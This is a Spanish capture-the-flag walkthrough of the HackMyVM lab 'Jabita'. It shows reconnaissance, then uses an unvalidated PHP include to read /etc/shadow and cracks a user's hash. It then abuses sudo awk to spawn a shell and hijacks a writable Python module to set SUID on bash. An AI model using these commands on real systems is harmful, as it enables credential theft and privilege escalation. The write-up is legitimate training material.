---
layout: default
title: Jabita
parent: HackMyVM
grand_parent: Writeups
---

# Jabita
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

Tenemos un sitio web el cual es vulnerable a LFI, aprovechandonos de eso incluiremos el archivo **/etc/shadow** el cual tiene un hash con SHA-512 para el usuario jack, lo crackearemos y accederemos por SSH, despues mostraremos los permisos de nivel de sudoers donde veremos que podemos abusar de **awk** para hacer **user pivoting** hacia **jaba**, para la escalada de privilegios haremos un **Python Library Hijacking**

{:.lead}

## Descubrimiento de la maquina

Debido a que la maquina pertece a nuestra red, debemos de escanear para buscar host activos, en mi caso usare **netdiscover**:

```ruby
netdiscover -i wlan0
```

- **i**: Indica la interfaz de red

Como no tengo muchos hosts en mi red, puedo deducir que la IP de la maqina es la **192.168.1.86**:

![](/assets/img/jabita/1.png)

Al hacerle un ping

```ruby
ping -c 1 192.168.1.86
```
Podemos ver que tiene un **TTL** de **64**, y un TTL <= 64 indica que es una maquina Linux

## Enumeracion

Iniciamos con un escaneo de nmap con:

```ruby
nmap -sS -n -Pn -T4 --open -p- 192.168.1.86 
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos


Y nos reporto 2 puertos abiertos

```ruby
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo ese puerto:

```ruby
nmap -sCV -p22,80 192.168.1.86
```

- sCV: es la union de sC y sV
    - sC: nmap usa scripts para sacar mas informacion del servicio
    - sV: Para sacar la version y el OS que corre en ese servicio

Esto nos arroja:

```ruby
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 00:b0:03:d3:92:f8:a0:f9:5a:93:20:7b:f8:0a:aa:da (ECDSA)
|_  256 dd:b4:26:1d:0c:e7:38:c3:7a:2f:07:be:f8:74:3e:bc (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

Realmente no tenemos algo interesante, mas que el servidor web que usa es Apache.

Si entramos al sitio web solo tendremos un mensaje, y al inspeccionar el codigo fuente solo una etiqueta **h1**

![](/assets/img/jabita/2.png)

### Fuzzing de directorios

Debido a que no encontramos nada interesante, podemos hacer fuzzing de directorios mediante fuerza bruta con wfuzz

```ruby
wfuzz -u 'http://192.168.1.86/FUZZ' -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100 --hc=404
```

- u: Es la URL
- w: Es la wordlist
- t: Es el numero de hilos (para ejecutar 100 tareas en paralelo)
- hc=404: Para ocultar las respuestas con el codigo de estado 404

Y nos arroja que encontro el directorio **building**

```ruby
301        9 L      28 W       315 Ch      "building"
```

### Inspeccionando el sitio web

Al entrar el sitio web vamos a poder ver que tenemos un navbar con 3 opciones

![](/assets/img/jabita/3.png)

Al darle en una de las opciones nos daremos cuenta de la forma tan peculiar en la que se incluyen los archivos

![](/assets/img/jabita/4.png)

En una URL, la query string empieza con el simbolo **?**, es decir que en esta URL la query string es: **?page=home.php**, en este caso, el **page** es un parametro por GET que esta funcionando para solicitar un recurso, el cual es **home.php**, que basicamente incluye el archivo **home.php** en el sitio web.

Parece poca cosa, pero esto es un gran indicio de un LFI

## LFI y shell como jack

**LFI es una vulnerabilidad la cual nos permite incluir archivos locales de donde reside el servidor.**

En un LFI normalito, regularmente se lee el archivo **/etc/passwd** para ver los usuarios del sistema e intentar leer las **id_rsa** de sus directorios home, tambien es posible leer archivos log para posteriormente hace un **log poisoning** y conseguir RCE, asi como tambien hacer uso de **wrappers**, pero nada de eso sera necesario en este caso.

Probando con varios archivos, podemos ver que podemos leer el archivo **/etc/shadow**, este archivo almacena los hashes de las contraseñas de los usuarios, y por defecto solo el usuario root tiene permisos de leerlo

![](/assets/img/jabita/5.png)

Podemos ver que el hash del usuario **jack** es diferente a los demas, este empieza con un **$6**, el cual indica que usa **SHA-512**.

En mi caso usare john para crackearlo:

```ruby
echo '$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0' > hash
```

```ruby
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Y la contraseña es: **joaninha**

Sabiendo las credendiales y como en la enumeracion descubrimos el puerto 22, podemos conectarnos como **jack**

Y ya somo jack:

```ruby
jack@jabita:~$ whoami
jack
```

## jack --> jaba

Al mirar los permisos a nivel de sudoers, podemos ver que el usuario jack puede ejecutar como el usuario jaba el comando **awk**

![](/assets/img/jabita/6.png)

Realizando una pequeña busqueda en [GFTObins](https://gtfobins.github.io/gtfobins/awk/) encontraremos que podemos abusar de awk para escalar privilegios, simplemente lo que esta haciendo es usar **BEGIN** para indicarle que ejecute **system("/bin/sh")** antes de leer el primer registro/linea de un archivo, en este caso awk no esta leyendo nada asi que simplemente se ejecuta el comando.

Si ingresamos 

```ruby
sudo -u jaba awk 'BEGIN {system("/bin/sh")}'
```

Ya seremos **jaba** y podemos leer la flag de user

```bash
jaba@jabita:/home/jack$ whoami ; find / -type f -name "user.txt" 2>/dev/null
jaba
/home/jaba/user.txt
```

## jaba --> root

Al mirar los permisos de nivel de sudoers, podemos que el usuario jaba puede ejecutar como root el archivo **/usr/bin/clean.py**

![](/assets/img/jabita/7.png)

Si lo ejecutamos lo unico que hace es imprimir **Hello**:

```bash
jaba@jabita:~$ python3 /usr/bin/clean.py
Hello
```

Si miramos su contenido podemos ver que importa una libreria que se llama **wild**

```python
import wild

wild.first()
```

Para obtener mas informacion, podemos usar el comando **find / -type f -name "wild.py" 2>/dev/null** para saber cual es la ruta del archivo **wild.py**:

```bash
/usr/lib/python3.10/wild.py
```

Si vemos su contenido, lo unico que esta haciendo es definir una funcion llamada **first**, la cual cuando sea llamada ejecutara un **print** que muestre el **Hello**

```python
def first():
	print("Hello")
```

### Python Library Hijacking (RW permissions)

Un escenario de python library hijacking, es que se este importando una libreria la cual tiene permisos de escritura, asi que nosotros podemos modificar su contenido para que relice una accion arbitraria

Si mostramos los permisos de la libreria **wild**, podemos ver que para otros usuarios tiene permisos **rw** (lectura y escritura)

```ruby
-rw-r--rw- 1 root root 29 Sep  5  2022 /usr/lib/python3.10/wild.py
```

En mi caso modificare el archivo para darle permisos SUID a bash, no es necesario hacerlo asi, de hecho simplemente se puede indicarle que ejecute bash (pero ya es comtumbre mia jsjs):

```python
import os
def first():
	os.system("chmod u+s /bin/bash")
```

Ahora solo damos **bash -p** y ya somos root

```bash
jaba@jabita:~$ bash -p
bash-5.1# whoami
root
```

## Extra: Entendiendo el LFI

Como extra, explicare por que el codigo del sitio web es vulnerable a LFI.

La ruta **/var/www/html/building** es la que se encuentra el archivo **index.php** que es vulnerable:

```html
<!DOCTYPE html>
<html>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
	<body>
		 <div class="w3-bar w3-black">
		  <a href="/building/index.php?page=home.php" class="w3-bar-item w3-button">Home</a>
		  <a href="/building/index.php?page=gallery.php" class="w3-bar-item w3-button">Gallery</a>
		  <a href="/building/index.php?page=contact.php" class="w3-bar-item w3-button">Contact</a>
		</div> 
	</body>
</html>

<?php
	include($_GET['page'])
?>
```

La parte vulnerable es esta de aca:

```php
<?php
	include($_GET['page'])
?>
```

La funcion **include** permite incluir en un sitio web un archivo y evidentemente su contenido, la vulnerabilidad radica en como se incluye el archivo: **$_GET['page']**, lo que esta haciendo es crear un parametro GET llamado **page** el cual va a recibir un archivo para que la funcion **include** lo procese y lo incluya, ejemplo: **page=home.php**, entonces como no se esta haciendo ninguna validacion de ningun tipo, si nosotros manipulamos el parametro **page** para que incluya otro archivo, simplemente va a mostrar su contenido, como lo hicimos con **/etc/shadow**.

Eso ha sido todo, gracias por leer ❤

